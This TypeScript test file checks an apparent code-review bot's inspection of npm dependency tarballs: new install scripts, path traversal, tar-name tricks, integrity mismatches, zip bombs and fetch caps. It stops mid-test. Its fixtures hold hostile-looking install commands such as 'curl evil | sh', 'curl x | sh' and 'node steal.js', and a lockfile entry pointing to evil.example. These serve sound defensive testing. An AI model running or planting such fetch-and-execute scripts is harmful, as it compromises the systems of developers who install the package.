// The Dependency check's tarball fetches, through the harness: install-script Findings and packages not inspected.
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { test } from 'node:test';
import { gunzipSync, gzipSync } from 'node:zlib';
import type { AppConfig } from '../src/app.ts';
import {
  delivery, FakeGitHub, FakeRegistry, gitFixture, integrityOf, noFindings, openedPayload, packageTarball, prPayload, ScriptedModel, tarball, testApp,
} from './harness.ts';

const REPO = 'acme/widgets';
const LOCK = 'package-lock.json';
const url = (name: string, version: string) => `https://registry.npmjs.org/${name}/-/${name.split('/').pop()}-${version}.tgz`;

const lock = (packages: Record<string, object>) => JSON.stringify(
  { name: 'app', version: '1.0.0', lockfileVersion: 3, requires: true, packages: { '': { name: 'app' }, ...packages } }, null, 2) + '\n';
const pkg = (name: string, version: string, extra: object = {}) =>
  ({ version, resolved: url(name, version), ...extra });
const deps = (versions: Record<string, string>) =>
  lock(Object.fromEntries(Object.entries(versions).map(([n, v]) => [`node_modules/${n}`, pkg(n, v)])));

/** The 1-based line of `"version"` under `key` in a lockfile. */
const versionLine = (text: string, key: string) => {
  const ls = text.split('\n');
  const from = ls.findIndex((l) => l.includes(`"${key}"`));
  return ls.findIndex((l, i) => i > from && l.includes('"version"')) + 1;
};

/** A PR changing the lockfile and a code file, so reviewers run and find nothing; approvals on. */
function setup(base: Record<string, object>, head: Record<string, object>, config: Partial<AppConfig> = {}) {
  const [baseLock, headLock] = [lock(base), lock(head)];
  const fx = gitFixture({ [LOCK]: baseLock, 'src/a.ts': 'a\n' }, { [LOCK]: headLock, 'src/a.ts': 'b\n' });
  const pr = { number: 9, state: 'open' as const, draft: false, headSha: fx.headSha, baseSha: fx.baseSha };
  const github = new FakeGitHub();
  github.addPullRequest(REPO, fx.url, pr);
  const registry = new FakeRegistry();
  const model = new ScriptedModel(Array.from({ length: 5 }, noFindings));
  const t = testApp({ model, github, registry, config: { approveWhenClean: true, ...config } });
  const opened = async () => {
    await t.app.receive(delivery('pull_request', openedPayload(REPO, pr)));
    await t.app.drain();
    return github.reviews.at(-1)!.review;
  };
  return { ...t, fx, pr, registry, model, headLock, opened };
}

test('an install script the new version adds is posted inline as high; one the old version already had is not', async () => {
  const s = setup(
    { 'node_modules/fresh': pkg('fresh', '1.0.0'), 'node_modules/steady': pkg('steady', '1.0.0') },
    { 'node_modules/fresh': pkg('fresh', '1.1.0'), 'node_modules/steady': pkg('steady', '1.1.0') },
  );
  s.registry.tarballs.set(url('fresh', '1.1.0'), packageTarball('fresh', '1.1.0', { postinstall: 'node steal.js', test: 'x' }));
  s.registry.tarballs.set(url('steady', '1.0.0'), packageTarball('steady', '1.0.0', { install: 'node-gyp rebuild' }));
  s.registry.tarballs.set(url('steady', '1.1.0'), packageTarball('steady', '1.1.0', { install: 'node-gyp rebuild' }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  const c = review.comments[0]!;
  assert.deepEqual([c.path, c.line], [LOCK, versionLine(s.headLock, 'node_modules/fresh')]);
  assert.match(c.body, /^\*\*fresh adds an install script\*\*\n\n`high` · security\n\n/);
  assert.match(c.body, /`postinstall`: `node steal\.js`/);
  assert.equal(review.event, 'COMMENT');
  assert.deepEqual(s.registry.fetched.sort(), [url('fresh', '1.0.0'), url('fresh', '1.1.0'), url('steady', '1.0.0'), url('steady', '1.1.0')]);
  // The security focus is told too.
  const told = JSON.stringify(s.model.requestsFor('security')[0]!.messages);
  assert.match(told, /fresh 1\.0\.0 → 1\.1\.0[^"]*new install scripts: postinstall: node steal\.js/);
});

test("the security focus is told which packages weren't inspected", async () => {
  const s = setup({ 'node_modules/gone': pkg('gone', '1.0.0') }, { 'node_modules/gone': pkg('gone', '1.0.1') });
  s.registry.missing.add(url('gone', '1.0.1'));
  await s.opened();

  assert.match(JSON.stringify(s.model.requestsFor('security')[0]!.messages), /not inspected\): gone 1\.0\.1/);
});

test("an install-script Thread isn't verified Fixed by a push whose tarball couldn't be fetched, and is once one without it is", async () => {
  const s = setup({ 'node_modules/fresh': pkg('fresh', '1.0.0') }, { 'node_modules/fresh': pkg('fresh', '1.1.0') });
  s.registry.tarballs.set(url('fresh', '1.1.0'), packageTarball('fresh', '1.1.0', { preinstall: 'curl x | sh' }));
  const c = (await s.opened()).comments[0]!;
  const thread = s.github.addThread(REPO, 9, c.path, c.line ?? null, c.body);
  const push = async (version: string) => {
    s.pr.headSha = s.fx.push({ [LOCK]: lock({ 'node_modules/fresh': pkg('fresh', version) }) });
    s.github.addPullRequest(REPO, s.fx.url, s.pr);
    await s.app.receive(delivery('pull_request', prPayload('synchronize', REPO, s.pr)));
    await s.app.drain();
    return s.github.reviews.at(-1)!.review;
  };

  s.registry.missing.add(url('fresh', '1.2.0'));
  await push('1.2.0');
  assert.equal(s.github.thread(thread.id).resolved, false);

  await push('1.3.0');
  assert.equal(s.github.thread(thread.id).resolved, true);
});

test('an install script whose command changed is new, though its name is not', async () => {
  const s = setup({ 'node_modules/cmd': pkg('cmd', '1.0.0') }, { 'node_modules/cmd': pkg('cmd', '1.0.1') });
  s.registry.tarballs.set(url('cmd', '1.0.0'), packageTarball('cmd', '1.0.0', { postinstall: 'node build.js' }));
  s.registry.tarballs.set(url('cmd', '1.0.1'), packageTarball('cmd', '1.0.1', { postinstall: 'curl evil | sh' }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  assert.match(review.comments[0]!.body, /`postinstall`: `curl evil \| sh`/);
});

test("a bundled entry must be in its bundler's tarball at its folder and version, or it is not inspected", async () => {
  const inner = (v: string) => ({ version: v, inBundle: true });
  const s = setup(
    { 'node_modules/host': pkg('host', '1.0.0'), 'node_modules/kept': pkg('kept', '1.0.0'), 'node_modules/sw': pkg('sw', '1.0.0') },
    {
      'node_modules/host': pkg('host', '1.1.0'), 'node_modules/host/node_modules/a': inner('1.0.0'),
      'node_modules/host/node_modules/a/node_modules/deep': inner('2.0.0'), 'node_modules/host/node_modules/gone': inner('1.0.0'),
      // A bundler that didn't move, now said to bundle a package it was never published with.
      'node_modules/kept': pkg('kept', '1.0.0'), 'node_modules/kept/node_modules/sw': inner('1.0.1'),
    },
  );
  s.registry.tarballs.set(url('host', '1.1.0'), packageTarball('host', '1.1.0', {}, {
    'node_modules/a/package.json': JSON.stringify({ version: '1.0.0' }),
    'node_modules/a/node_modules/deep/package.json': JSON.stringify({ version: '2.0.0' }),
    'node_modules/gone/package.json': JSON.stringify({ version: '9.9.9' }),
  }));
  const review = await s.opened();

  assert.match(review.body, /2 packages weren't inspected/);
  assert.match(review.body, /Not inspected[^\n]*\n- `gone 1\.0\.0`\n- `sw 1\.0\.1`\n\n/);
});

test('past the fetch cap, the riskiest packages are fetched and the rest are listed as not inspected, blocking approval', async () => {
  const s = setup(
    { 'node_modules/minor': pkg('minor', '1.0.0'), 'node_modules/major': pkg('major', '1.0.0') },
    { 'node_modules/minor': pkg('minor', '1.1.0'), 'node_modules/major': pkg('major', '2.0.0'), 'node_modules/added': pkg('added', '1.0.0') },
    { registryFetchPackages: 2 },
  );
  const review = await s.opened();

  assert.deepEqual(s.registry.fetched.sort(), [url('added', '1.0.0'), url('major', '1.0.0'), url('major', '2.0.0')]);
  assert.equal(review.event, 'COMMENT');
  assert.match(review.body, /\*\*Not approved:\*\* 1 package wasn't inspected \(listed below\)/);
  assert.match(review.body, /Not inspected \(its published code couldn't be fetched and read\):\n- `minor 1\.1\.0`\n/);
});

test('a package whose tarball 404s, is over the byte cap, or resolves off the registry is not inspected and blocks', async () => {
  const big = packageTarball('big', '1.1.0', {}, { 'blob.bin': Array.from({ length: 4000 }, (_, i) => i.toString(36)).join('') });
  const s = setup(
    { 'node_modules/gone': pkg('gone', '1.0.0'), 'node_modules/big': pkg('big', '1.0.0') },
    {
      'node_modules/gone': pkg('gone', '1.1.0'), 'node_modules/big': pkg('big', '1.1.0'),
      'node_modules/forked': pkg('forked', '1.0.0', { resolved: 'https://evil.example/forked-1.0.0.tgz' }),
    },
    { registryFetchBytes: big.length - 1 },
  );
  s.registry.missing.add(url('gone', '1.1.0'));
  s.registry.tarballs.set(url('big', '1.1.0'), big);
  const review = await s.opened();

  assert.ok(!s.registry.fetched.some((u) => u.includes('evil')));
  assert.match(review.body, /3 packages weren't inspected/);
  assert.match(review.body, /- `big 1\.1\.0`\n- `forked 1\.0\.0`\n- `gone 1\.1\.0`/);
  assert.equal(s.logs.find((l) => l.msg === 'dependencies checked')!.notInspected, 3);
  assert.deepEqual(s.logs.filter((l) => l.msg === 'package fetch failed').map((l) => l.url).sort(), [url('big', '1.1.0'), url('gone', '1.1.0')]);
});

test('a tarball entry escaping the package folder is ignored, even one that would land on package.json', async () => {
  const s = setup({ 'node_modules/sly': pkg('sly', '1.0.0') }, { 'node_modules/sly': pkg('sly', '1.0.1') });
  const other = JSON.stringify({ name: 'sly', scripts: { preinstall: 'node other.js' } });
  s.registry.tarballs.set(url('sly', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'sly', scripts: { postinstall: 'node real.js' } }),
    'package/../../package.json': other,
    'package/../package.json': other,
    // Normalized first, this would replace the root package.json and hide its script.
    'package/../x/package.json': JSON.stringify({ name: 'sly' }),
  }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  assert.match(review.comments[0]!.body, /`postinstall`: `node real\.js`/);
  assert.doesNotMatch(review.comments[0]!.body, /preinstall/);
});

test("the real registry adapter refuses any host but the npm registry's, before any network", async () => {
  const { npmRegistry } = await import('../src/registry.ts');
  await assert.rejects(npmRegistry().tarball('https://evil.example/registry.npmjs.org/a/-/a-1.0.0.tgz', 1000), /refused/);
  await assert.rejects(npmRegistry().tarball('https://registry.npmjs.org.evil.example/a/-/a-1.0.0.tgz', 1000), /refused/);
});

/** A pax extended header's records, each prefixed by its own length. */
const pax = (fields: Record<string, string>) => Object.entries(fields).map(([k, v]) => {
  const rest = ` ${k}=${v}\n`;
  let n = rest.length;
  while (`${n}${rest}`.length !== n) n = `${n}${rest}`.length;
  return `${n}${rest}`;
}).join('');

test('a package.json named by a pax header or a GNU long name is the one read, as npm extracts it', async () => {
  const s = setup({ 'node_modules/p': pkg('p', '1.0.0'), 'node_modules/g': pkg('g', '1.0.0') },
    { 'node_modules/p': pkg('p', '1.0.1'), 'node_modules/g': pkg('g', '1.0.1') });
  const evil = JSON.stringify({ name: 'x', scripts: { postinstall: 'node evil.js' } });
  s.registry.tarballs.set(url('p', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'p' }), 'PaxHeader/decoy': pax({ path: 'package/package.json' }), 'package/decoy': evil,
  }, { 'PaxHeader/decoy': 'x' }));
  s.registry.tarballs.set(url('g', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'g' }), '././@LongLink': 'package/package.json\0', 'package/decoy2': evil,
  }, { '././@LongLink': 'L', 'package/decoy2': '7' }));
  const review = await s.opened();

  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]), ['**g adds an install script**', '**p adds an install script**']);
});

test("a bundled package is inspected on its own, from its bundler's tarball on each side, even when only its bundler moved", async () => {
  const inner = (v: string) => ({ version: v, inBundle: true });
  const s = setup(
    {
      'node_modules/host': pkg('host', '1.0.0'), 'node_modules/host/node_modules/a': inner('1.0.0'),
      'node_modules/host/node_modules/m': inner('1.0.0'), 'node_modules/b': pkg('b', '1.0.0'), 'node_modules/top': pkg('top', '1.0.0'),
    },
    {
      // a keeps its version while its bundler moves: its code is whatever the new bundler ships.
      'node_modules/host': pkg('host', '1.1.0'), 'node_modules/host/node_modules/a': inner('1.0.0'),
      // m moves folder with the same script: not new. top is now a bundled copy with a script it didn't have.
      'node_modules/host/node_modules/x': inner('1.0.0'), 'node_modules/host/node_modules/x/node_modules/m': inner('1.0.0'),
      'node_modules/host/node_modules/top': inner('1.0.1'),
      'node_modules/b': pkg('b', '1.0.1', { inBundle: true }),
    },
  );
  const manifest = (name: string, version: string, scripts = {}) => JSON.stringify({ name, version, scripts });
  s.registry.tarballs.set(url('host', '1.0.0'), packageTarball('host', '1.0.0', {}, {
    'node_modules/a/package.json': manifest('a', '1.0.0'), 'node_modules/m/package.json': manifest('m', '1.0.0', { install: 'node m.js' }),
  }));
  s.registry.tarballs.set(url('host', '1.1.0'), packageTarball('host', '1.1.0', {}, {
    'node_modules/a/package.json': manifest('a', '1.0.0', { postinstall: 'node a.js' }),
    'node_modules/x/package.json': manifest('x', '1.0.0'), 'node_modules/x/node_modules/m/package.json': manifest('m', '1.0.0', { install: 'node m.js' }),
    'node_modules/top/package.json': manifest('top', '1.0.1', { preinstall: 'node t.js' }),
  }));
  const review = await s.opened();

  assert.ok(s.registry.fetched.includes(url('b', '1.0.1')), 'an inBundle entry with a source of its own is fetched');
  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]).sort(), ['**a adds an install script**', '**top adds an install script**']);
  assert.doesNotMatch(review.body, /Not inspected/);
});

test('a bundled copy no change inspects on its own is compared with its bundler: unlisted, a second install, or sourced', async () => {
  const inner = (v: string, extra: object = {}) => ({ version: v, inBundle: true, ...extra });
  const s = setup(
    {
      'node_modules/h1': pkg('h1', '1.0.0'), 'node_modules/h1/node_modules/dup': inner('1.0.0'),
      'node_modules/h2': pkg('h2', '1.0.0'), 'node_modules/h2/node_modules/dup': inner('1.0.0'),
      'node_modules/h3': pkg('h3', '1.0.0'), 'node_modules/h3/node_modules/src': inner('1.0.0', { resolved: url('src', '1.0.0') }),
    },
    {
      // h1 also bundles a package the lockfile doesn't list.
      'node_modules/h1': pkg('h1', '1.1.0'), 'node_modules/h1/node_modules/dup': inner('1.0.0'),
      'node_modules/h2': pkg('h2', '1.1.0'), 'node_modules/h2/node_modules/dup': inner('1.0.0'),
      // An inBundle entry with its own source is still installed from its bundler's tarball.
      'node_modules/h3': pkg('h3', '1.1.0'), 'node_modules/h3/node_modules/src': inner('1.0.1', { resolved: url('src', '1.0.1') }),
    },
  );
  const m = (name: string, version: string, scripts = {}) => JSON.stringify({ name, version, scripts });
  for (const h of ['h1', 'h2']) s.registry.tarballs.set(url(h, '1.0.0'), packageTarball(h, '1.0.0', {}, { 'node_modules/dup/package.json': m('dup', '1.0.0') }));
  s.registry.tarballs.set(url('h1', '1.1.0'), packageTarball('h1', '1.1.0', {}, {
    'node_modules/dup/package.json': m('dup', '1.0.0'), 'node_modules/ghost/package.json': m('ghost', '1.0.0', { postinstall: 'node g.js' }),
  }));
  // The second install of dup@1.0.0 gains a script in its new bundler.
  s.registry.tarballs.set(url('h2', '1.1.0'), packageTarball('h2', '1.1.0', {}, { 'node_modules/dup/package.json': m('dup', '1.0.0', { install: 'node d.js' }) }));
  s.registry.tarballs.set(url('h3', '1.0.0'), packageTarball('h3', '1.0.0', {}, { 'node_modules/src/package.json': m('src', '1.0.0') }));
  s.registry.tarballs.set(url('h3', '1.1.0'), packageTarball('h3', '1.1.0', {}, { 'node_modules/src/package.json': m('src', '1.0.1', { preinstall: 'node s.js' }) }));
  const review = await s.opened();

  const titles = review.comments.map((c) => c.body.split('\n')[0]).sort();
  assert.ok(titles.includes('**h1 adds an install script**'), titles.join());
  assert.match(review.comments.find((c) => c.body.startsWith('**h1'))!.body, /`node_modules\/ghost postinstall`: `node g\.js`/);
  assert.ok(titles.includes('**src adds an install script**'), titles.join());
  assert.ok(!s.registry.fetched.includes(url('src', '1.0.1')), 'read from h3, not fetched on its own');
  // Each install of dup@1.0.0 moved bundler, so each is a change of its own: the one under h2 gains a script.
  assert.match(review.comments.find((c) => c.body.startsWith('**dup'))!.body, /`install`: `node d\.js`/);
  assert.ok(!titles.includes('**h2 adds an install script**'), titles.join());
});

test("a tarball that doesn't match the lockfile's integrity is not inspected, so a same-URL swap can't compare a tarball with itself", async () => {
  const real = packageTarball('ok', '1.0.1', { postinstall: 'node ok.js' });
  const s = setup(
    { 'node_modules/ok': pkg('ok', '1.0.0'), 'node_modules/swap': pkg('swap', '1.0.0', { integrity: integrityOf('swap', '1.0.0') }) },
    {
      'node_modules/ok': pkg('ok', '1.0.1', { integrity: `sha1-x sha512-${integrityOf('ok', '1.0.1', real).slice(7)}` }),
      // Same URL, another integrity: the base's bytes can't be fetched again.
      'node_modules/swap': pkg('swap', '1.0.0', { integrity: 'sha512-AAAA' }),
    },
  );
  s.registry.tarballs.set(url('ok', '1.0.1'), real);
  const review = await s.opened();

  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]), ['**ok adds an install script**']);
  assert.match(review.body, /Not inspected[^\n]*\n- `swap 1\.0\.0`\n\n/);
});

test("a bundled package whose bundler's integrity changed at the same URL is a change, and fails closed", async () => {
  const s = setup(
    { 'node_modules/host': pkg('host', '1.0.0', { integrity: 'sha512-AAAA' }), 'node_modules/host/node_modules/a': { version: '1.0.0', inBundle: true } },
    { 'node_modules/host': pkg('host', '1.0.0', { integrity: integrityOf('host', '1.0.0') }), 'node_modules/host/node_modules/a': { version: '1.0.0', inBundle: true } },
  );
  const review = await s.opened();

  assert.match(review.body, /- `a 1\.0\.0 \(source or integrity changed\)`/);
  assert.match(review.body, /Not inspected[^\n]*\n- `a 1\.0\.0`\n- `host 1\.0\.0`\n\n/);
});

test("integrity is checked by the strongest algorithm the lockfile records, as npm checks it", async () => {
  const body = packageTarball('weak', '1.0.1');
  const sha1 = `sha1-${createHash('sha1').update(body).digest('base64')}`;
  const s = setup({ 'node_modules/weak': pkg('weak', '1.0.0') },
    { 'node_modules/weak': pkg('weak', '1.0.1', { integrity: `${sha1} sha512-AAAA` }) });
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `weak 1\.0\.1`\n\n/);
});

test('a tarball that would unpack past the limit spends the rest of it, so the next is not unpacked that far', async () => {
  const s = setup({ 'node_modules/bomb': pkg('bomb', '1.0.0'), 'node_modules/next': pkg('next', '1.0.0') },
    { 'node_modules/bomb': pkg('bomb', '1.0.1'), 'node_modules/next': pkg('next', '1.0.1') }, { registryFetchBytes: 3000 });
  // Compresses to far under the fetch cap, unpacks past 8 times it.
  s.registry.tarballs.set(url('bomb', '1.0.1'), packageTarball('bomb', '1.0.1', {}, { 'zeros.bin': '\0'.repeat(100_000) }));
  const review = await s.opened();

  assert.match(review.body, /- `bomb 1\.0\.1`\n- `next 1\.0\.1`\n\n/);
});

test('a gzip that fails any other way spends the rest of the unpacked allowance too', async () => {
  const s = setup({ 'node_modules/bad': pkg('bad', '1.0.0'), 'node_modules/next': pkg('next', '1.0.0') },
    { 'node_modules/bad': pkg('bad', '1.0.1'), 'node_modules/next': pkg('next', '1.0.1') });
  // A bad trailer: everything unpacks, then the checksum fails.
  const bad = Buffer.from(packageTarball('bad', '1.0.1'));
  bad[bad.length - 8] ^= 0xff;
  s.registry.tarballs.set(url('bad', '1.0.1'), bad);
  const review = await s.opened();

  assert.match(review.body, /- `bad 1\.0\.1`\n- `next 1\.0\.1`\n\n/);
});

test('a failed fetch spends the bytes it received, so oversized tarballs can\'t each take the whole budget', async () => {
  const big = (n: string) => packageTarball(n, '1.0.1', {}, { 'blob.bin': Array.from({ length: 4000 }, (_, i) => `${n}${i}`).join('') });
  const s = setup({ 'node_modules/x1': pkg('x1', '1.0.0'), 'node_modules/x2': pkg('x2', '1.0.0') },
    { 'node_modules/x1': pkg('x1', '1.0.1'), 'node_modules/x2': pkg('x2', '1.0.1') }, { registryFetchBytes: 1000 });
  s.registry.tarballs.set(url('x1', '1.0.1'), big('x1'));
  s.registry.tarballs.set(url('x2', '1.0.1'), big('x2'));
  const review = await s.opened();

  assert.deepEqual(s.registry.fetched, [url('x1', '1.0.1')]);
  assert.match(review.body, /2 packages weren't inspected/);
});

test('a tarball node-tar warns on (bad checksum, cut off mid-entry) or with a non-ASCII path is not inspected', async () => {
  const names = ['sum', 'cut', 'uni'];
  const s = setup(Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.0')])),
    Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.1')])));
  const plain = (n: string) => gunzipSync(packageTarball(n, '1.0.1'));
  const sum = plain('sum');
  sum[0] = 'q'.charCodeAt(0);
  // Cut inside the first entry's data, after its header.
  const cut = plain('cut').subarray(0, 520);
  for (const [n, body] of [['sum', sum], ['cut', cut]] as const) s.registry.tarballs.set(url(n, '1.0.1'), gzipSync(body));
  // A filesystem may fold `ſ` (long s) to `s`, or not.
  s.registry.tarballs.set(url('uni', '1.0.1'), tarball({ 'package/package.json': JSON.stringify({ name: 'uni' }), 'package/ſcript.js': '' }));
  const review = await s.opened();

  assert.match(review.body, /3 packages weren't inspected/);
  assert.equal(s.logs.filter((l) => l.msg === 'package fetch failed' && l.error === 'malformed tar archive').length, 3);
});

test('on a case-insensitive filesystem two paths are one: such a tarball is not inspected, and any-case manifests count', async () => {
  const s = setup({ 'node_modules/cc': pkg('cc', '1.0.0'), 'node_modules/up': pkg('up', '1.0.0') },
    { 'node_modules/cc': pkg('cc', '1.0.1'), 'node_modules/up': pkg('up', '1.0.1'), 'node_modules/up/node_modules/b': { version: '1.0.0', inBundle: true } });
  s.registry.tarballs.set(url('cc', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'cc' }), 'package/PACKAGE.JSON': JSON.stringify({ scripts: { postinstall: 'x' } }),
  }));
  s.registry.tarballs.set(url('up', '1.0.1'), packageTarball('up', '1.0.1', {}, {
    'NODE_MODULES/b/Package.json': JSON.stringify({ version: '1.0.0', scripts: { preinstall: 'node b.js' } }),
  }));
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `cc 1\.0\.1`\n\n/);
  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]), ['**b adds an install script**']);
});

test("a file path Windows would take for another name (a trailing dot or space, a `:` stream) is not inspected", async () => {
  const names = ['dot', 'space', 'stream'];
  const s = setup(Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.0')])),
    Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.1')])));
  const evil = JSON.stringify({ scripts: { postinstall: 'node evil.js' } });
  for (const [n, alias] of [['dot', 'package.json.'], ['space', 'package.json '], ['stream', 'package.json::$DATA']]) {
    s.registry.tarballs.set(url(n!, '1.0.1'), tarball({ 'package/package.json': JSON.stringify({ name: n }), [`package/${alias}`]: evil }));
  }
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `dot 1\.0\.1`\n- `space 1\.0\.1`\n- `stream 1\.0\.1`\n\n/);
});

test('the tarballs a run fetches are capped, old versions and failed fetches included', async () => {
  // One new version, a different old one in each lockfile: the package cap admits it once, the old versions add up.
  const olds = ['1.0.0', '1.1.0', '1.2.0'];
  const fx = gitFixture(Object.fromEntries(olds.map((v, i) => [`w${i}/${LOCK}`, lock({ 'node_modules/x': pkg('x', v) })])),
    Object.fromEntries(olds.map((_, i) => [`w${i}/${LOCK}`, lock({ 'node_modules/x': pkg('x', '2.0.0') })])));
  const pr = { number: 9, state: 'open' as const, draft: false, headSha: fx.headSha, baseSha: fx.baseSha };
  const github = new FakeGitHub();
  github.addPullRequest(REPO, fx.url, pr);
  const registry = new FakeRegistry();
  for (const v of olds) registry.missing.add(url('x', v));
  const t = testApp({ model: new ScriptedModel([]), github, registry, config: { registryFetchPackages: 1 } });
  await t.app.receive(delivery('pull_request', openedPayload(REPO, pr)));
  await t.app.drain();

  // Twice the package cap: the new version and one old one.
  assert.deepEqual(registry.fetched, [url('x', '2.0.0'), url('x', '1.0.0')]);
  assert.match(github.reviews.at(-1)!.review.body, /Not inspected[^\n]*\n- `x 2\.0\.0`\n- `x 2\.0\.0`\n- `x 2\.0\.0`\n\n/);
});

test('a file and a directory at one path, in either order, are not inspected: extracting keeps whichever came last', async () => {
  const names = ['later', 'earlier', 'under'];
  const s = setup(Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.0')])),
    Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.1')])));
  const manifest = JSON.stringify({ name: 'x' });
  s.registry.tarballs.set(url('later', '1.0.1'), tarball({ 'package/package.json': manifest, 'package/PACKAGE.JSON/': '' }, { 'package/PACKAGE.JSON/': '5' }));
  s.registry.tarballs.set(url('earlier', '1.0.1'), tarball({ 'package/lib/': '', 'package/package.json': manifest, 'package/lib': '' }, { 'package/lib/': '5' }));
  s.registry.tarballs.set(url('under', '1.0.1'), tarball({ 'package/package.json': manifest, 'package/package.json/x': '' }));
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `earlier 1\.0\.1`\n- `later 1\.0\.1`\n- `under 1\.0\.1`\n\n/);
});

test('a link in a tarball, which npm would extract over a file, is not inspected', async () => {
  const s = setup({ 'node_modules/ln': pkg('ln', '1.0.0') }, { 'node_modules/ln': pkg('ln', '1.0.1') });
  s.registry.tarballs.set(url('ln', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'ln' }), 'package/other.json': '{}', 'package/link': '',
  }, { 'package/link': '2' }));
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `ln 1\.0\.1`\n\n/);
});

test('a binding.gyp with no install script runs node-gyp on install, so it counts as one', async () => {
  const s = setup({ 'node_modules/native': pkg('native', '1.0.0') }, { 'node_modules/native': pkg('native', '1.1.0') });
  s.registry.tarballs.set(url('native', '1.1.0'), packageTarball('native', '1.1.0', {}, { 'binding.gyp': '{}' }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  assert.match(review.comments[0]!.body, /`install`: `node-gyp rebuild`/);
});

test('install scripts are as npm runs them: an empty one runs nothing, but leaves the node-gyp default, which gypfile false turns off', async () => {
  const s = setup({ 'node_modules/e': pkg('e', '1.0.0'), 'node_modules/g': pkg('g', '1.0.0'), 'node_modules/n': pkg('n', '1.0.0') },
    { 'node_modules/e': pkg('e', '1.1.0'), 'node_modules/g': pkg('g', '1.1.0'), 'node_modules/n': pkg('n', '1.1.0') });
  const gyp = { 'binding.gyp': '{}' };
  s.registry.tarballs.set(url('e', '1.1.0'), packageTarball('e', '1.1.0', { postinstall: '' }));
  s.registry.tarballs.set(url('g', '1.1.0'), packageTarball('g', '1.1.0', { install: '' }, gyp));
  s.registry.tarballs.set(url('n', '1.1.0'), tarball({ 'package/package.json': JSON.stringify({ name: 'n', gypfile: false }), 'package/binding.gyp': '{}' }));
  const review = await s.opened();

  // npm (@npmcli/run-script) tests `!scripts.install`: an empty install still gets node-gyp rebuild.
  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]), ['**g adds an install script**']);
  assert.match(review.comments[0]!.body, /`install`: `node-gyp rebuild`/);
});

test('a package with no recorded source, not bundled, is not inspected', async () => {
  const s = setup({ 'node_modules/bare': { version: '1.0.0' } }, { 'node_modules/bare': { version: '1.0.1' } });
  const review = await s.opened();

  assert.match(review.body, /1 package wasn't inspected/);
  assert.match(review.body, /Not inspected[^\n]*\n- `bare 1\.0\.1`\n\n/);
});

test('fetches are logged one by one, and a Run superseded mid-fetch stops before the next', async () => {
  const names = ['a1', 'a2', 'a3'];
  const s = setup(Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.0')])),
    Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.1')])));
  const real = s.registry.tarball.bind(s.registry);
  let pushed = false;
  s.registry.tarball = async (u, max) => {
    if (!pushed) {
      pushed = true;
      s.pr.headSha = s.fx.push({ 'src/a.ts': 'c\n' });
      s.github.addPullRequest(REPO, s.fx.url, s.pr);
      await s.app.receive(delivery('pull_request', prPayload('synchronize', REPO, s.pr)));
    }
    return real(u, max);
  };
  await s.opened();

  const first = s.logs.filter((l) => l.msg === 'package fetched' && l.run === 1);
  assert.deepEqual(first.map((l) => l.url), [url('a1', '1.0.1')]);
  assert.deepEqual(s.github.reviews.map((r) => r.review.commit_id), [s.pr.headSha]);
});

test('every install of one version swapped to another tarball is inspected, not just the first', async () => {
  // The first install now pins the registry's tarball; the second, an integrity that tarball doesn't match.
  const s = setup(
    { 'node_modules/y': pkg('y', '1.0.0'), 'node_modules/x': pkg('x', '1.0.0'), 'node_modules/y/node_modules/x': pkg('x', '1.0.0') },
    {
      'node_modules/y': pkg('y', '1.0.0'), 'node_modules/x': pkg('x', '1.0.0', { integrity: integrityOf('x', '1.0.0') }),
      'node_modules/y/node_modules/x': pkg('x', '1.0.0', { integrity: 'sha512-AAAA' }),
    },
  );
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `x 1\.0\.0`\n/);
});

test('a bundled package moving to another bundler is a change, though neither bundler records a source', async () => {
  const s = setup(
    { 'node_modules/h1': { version: '1.0.0' }, 'node_modules/h1/node_modules/a': { version: '1.0.0', inBundle: true } },
    { 'node_modules/h2': { version: '1.0.0' }, 'node_modules/h2/node_modules/a': { version: '1.0.0', inBundle: true } },
  );
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `a 1\.0\.0`\n/);
});

test('a tar path longer than any filesystem extracts is not inspected', async () => {
  const s = setup({ 'node_modules/deep': pkg('deep', '1.0.0') }, { 'node_modules/deep': pkg('deep', '1.0.1') });
  s.registry.tarballs.set(url('deep', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'deep' }), 'PaxHeader/x': pax({ path: `package/${'a/'.repeat(3000)}x` }), 'package/x': '',
  }, { 'PaxHeader/x': 'x' }));
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `deep 1\.0\.1`\n/);
});

test("one deadline covers all of a run's fetches: a hung registry leaves the rest not inspected, without waiting on each", async () => {
  const s = setup({ 'node_modules/a': pkg('a', '1.0.0'), 'node_modules/b': pkg('b', '1.0.0') },
